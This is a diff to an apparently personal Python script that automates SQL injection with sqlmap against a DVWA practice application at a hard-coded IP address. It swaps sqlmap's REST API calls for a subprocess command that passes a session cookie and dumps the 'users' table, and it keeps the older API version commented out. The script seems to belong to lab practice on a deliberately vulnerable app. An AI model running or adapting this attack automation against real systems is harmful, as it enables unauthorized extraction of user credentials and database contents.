@@ -4,6 +4,7 @@ import json
 import time
 import lxml
 import html5lib
+import subprocess
 
 # while input("\n\nEnter 'f' to halt the program -: ") != 'f': # Enter f for half the progarm rest to continue
 # Part - 1
@@ -115,36 +116,42 @@ results = result_response.json()
 print(f"Scan Results: {json.dumps(results['data'][2]['value'], indent=2)}")
 
     
-# Part-6
-temRes = requests.get(f"{sqlmapUrl}/task/new")
-taskId = temRes.json().get("taskid")
-print("the taskid is - ",taskId)
-# temDb = input("Enter the 1 Database using above info -: ")
-# temTable = input("Enter the tables using above info (use ',') -: ")
-sqlSendData = {
-    "url": "http://194.238.16.27/vulnerabilities/sqli/?id=3&Submit=Submit",
-    "cookie": "PHPSESSID=your_php_sessid; security=low",  # Replace with actual session ID
-    "method": "GET",
-    "db": "dvwa",  # The database name
-    "tbl": ["users", "guestbook"],  # List of tables to fetch data from
-    "dumpAll": True,  # Extracts all data from the specified tables
-    "batch":True,
-    "technique":"T",
-}
-headers = {'Content-Type': 'application/json'}
-sqlRes = requests.post(f"{sqlmapUrl}/option/{taskId}/set",data=json.dumps(sqlSendData),headers=headers)
-sqlRes = requests.post(f"{sqlmapUrl}/scan/{taskId}/start",data=json.dumps(sqlSendData),headers=headers)
-if sqlRes.status_code != 200:
-    raise Exception("something wrong in the part 6 while searching for table data")
+# Part-6 get the table data using direct python ./sqlmap-dev/sqlmap.py
+result = subprocess.run(["powershell",f"python ./sqlmap-dev/sqlmap.py --cookie='PHPSESSID={cookies_dict['PHPSESSID']};security=low' -u '{url}/?id=3&Submit=Submit' -p 'id' --batch --dump -T users"],capture_output=True,text=True)
+print(result.stdout)
 
-while True:
-    sqlRes = requests.get(f"{sqlmapUrl}/scan/{taskId}/status")
-    sqlResData = sqlRes.json()
-    print(f"Scan Status : {sqlResData['status']}")
-    if sqlResData['status'] == 'terminated':
-        break
-    time.sleep(10)
 
-result_response = requests.get(f"{sqlmapUrl}/scan/{taskId}/data")
-results = result_response.json()
-print(f"Table Data: {json.dumps(results, indent=2)}")
+exit()
+
+# temRes = requests.get(f"{sqlmapUrl}/task/new")
+# taskId = temRes.json().get("taskid")
+# print("the taskid is - ",taskId)
+# # temDb = input("Enter the 1 Database using above info -: ")
+# # temTable = input("Enter the tables using above info (use ',') -: ")
+# sqlSendData = {
+#     "url": "http://194.238.16.27/vulnerabilities/sqli/?id=3&Submit=Submit",
+#     "cookie": "PHPSESSID=your_php_sessid; security=low",  # Replace with actual session ID
+#     "method": "GET",
+#     "db": "dvwa",  # The database name
+#     "tbl": ["users"],  # List of tables to fetch data from
+#     "dumpAll": False,  # Extracts all data from the specified tables
+#     "batch":True,
+#     "technique":"U",
+# }
+# headers = {'Content-Type': 'application/json'}
+# sqlRes = requests.post(f"{sqlmapUrl}/option/{taskId}/set",data=json.dumps(sqlSendData),headers=headers)
+# sqlRes = requests.post(f"{sqlmapUrl}/scan/{taskId}/start",data=json.dumps(sqlSendData),headers=headers)
+# if sqlRes.status_code != 200:
+#     raise Exception("something wrong in the part 6 while searching for table data")
+
+# while True:
+#     sqlRes = requests.get(f"{sqlmapUrl}/scan/{taskId}/status")
+#     sqlResData = sqlRes.json()
+#     print(f"Scan Status : {sqlResData['status']}")
+#     if sqlResData['status'] == 'terminated':
+#         break
+#     time.sleep(10)
+
+# result_response = requests.get(f"{sqlmapUrl}/scan/{taskId}/data")
+# results = result_response.json()
+# print(f"Table Data: {json.dumps(results, indent=2)}")
